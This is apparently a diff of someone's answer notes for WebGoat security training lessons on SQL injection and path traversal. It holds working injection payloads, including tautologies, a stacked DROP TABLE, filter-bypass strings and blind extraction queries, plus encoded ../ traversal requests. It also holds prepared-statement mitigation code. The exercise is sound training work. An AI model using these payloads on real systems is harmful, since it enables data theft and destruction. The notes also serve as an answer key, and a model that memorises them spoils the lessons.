@@ -1,17 +1,17 @@
 # SQL Injection (Intro)
-2. SELECT department FROM employees WHERE userid = 96134
-3. UPDATE employees SET department = 'Sales' WHERE last_name = 'Barnett'
-4. ALTER TABLE employees ADD phone varchar(20)
-5. GRANT ALL ON grant_rights TO unauthorized_user
-9. SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
-10. SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
-11. ' OR 1 =1 --
-12. '; UPDATE employees SET salary=100000 WHERE last_name = 'Smith' -- 
-13. '; DROP TABLE access_log
+### 2 SELECT department FROM employees WHERE userid = 96134
+### 3 UPDATE employees SET department = 'Sales' WHERE last_name = 'Barnett'
+### 4 ALTER TABLE employees ADD phone varchar(20)
+### 5 GRANT ALL ON grant_rights TO unauthorized_user
+### 9 SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
+### 10 SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
+### 11 ' OR 1 =1 --
+### 12 '; UPDATE employees SET salary=100000 WHERE last_name = 'Smith' -- 
+### 13 '; DROP TABLE access_log
 
 # SQL Injection (Advanced)
-3. SELECT * FROM user_data WHERE last_name = 'Smith'; SELECT * FROM user_system_data --'
-5. tom' AND '1'='1
+### 3 SELECT * FROM user_data WHERE last_name = 'Smith'; SELECT * FROM user_system_data --'
+### 5 tom' AND '1'='1
     returns: User {0} already exists please try to register with a different username.
 
    tom' AND '1'='2
@@ -19,7 +19,7 @@
 
    what means that register form changes output based on bool value returned by query.
    We will use script inject_script.py which sends 'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}' in put method to register field
-6.
+### 6
     1.4
     2.3
     3.2
@@ -28,7 +28,7 @@
     6.4
 
 # SQL Injection (Mitigation)
-5.
+### 5
     getConnection
         PreparedStatement statement
     prepareStatement
@@ -37,7 +37,7 @@
     statement.setString(1, pName)
     statement.setString(2, pMail)
 
-6.
+### 6
 try {
     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
     String query = "SELECT first_name, last_name, FROM users WHERE acct_id = ?";
@@ -47,3 +47,49 @@ try {
 } catch (Exception e) {
     System.out.println("Oops. Something went wrong!");
 }
+
+### 9
+'OR'1'='1';SELECT/**/*/**/FROM/**/user_system_data;--
+
+### 10
+'SSELECTELECT' -> leaves SELECT
+
+'sSELECTelect/**/*/**/fFROMrom/**/USER_SYSTEM_DATA;--'
+
+### 12
+(CASE WHEN (SELECT substring(ip, 1, 1) FROM servers where hostname = 'webgoat-prd') = '1' THEN ip ELSE mac END)
+(CASE WHEN (SELECT substring(ip, 1, 2) FROM servers where hostname = 'webgoat-prd') = '10' THEN ip ELSE mac END)
+(CASE WHEN (SELECT substring(ip, 1, 3) FROM servers where hostname = 'webgoat-prd') = '104' THEN ip ELSE mac END)
+
+
+ip = 104.130.219.202
+
+# Path Traversal
+### 2
+1. open ZAP
+2. add some file
+3. start breakpoint with HTTP request header
+4. change to Text type (up)
+4. go all the way down in text message and change fullName = ../gabi
+
+### 3 
+....//test in username field is enough
+
+### 4 
+Use ZAP, change filename field to '../gabi'
+
+### 5
+1. Burp
+2. open web browser
+3. go to page 5
+4. start intercatping
+5. click gen random cat
+6. sento to repeater (ctr+r)
+7. change first line to:
+GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret HTTP/1.1
+
+You found it submit the SHA-512 hash of your username as answer
+sha512(gabriel) = 5dbe7d079067809bb06f7c80de78ecb9d914f5735265148cd704f85353fc0b5114ebbfc960539cd3f430e7b12eb3fdc261726bb756bab9658c6db6a302913df1
+
+### 7
+Make new zip file, with any file. It passes
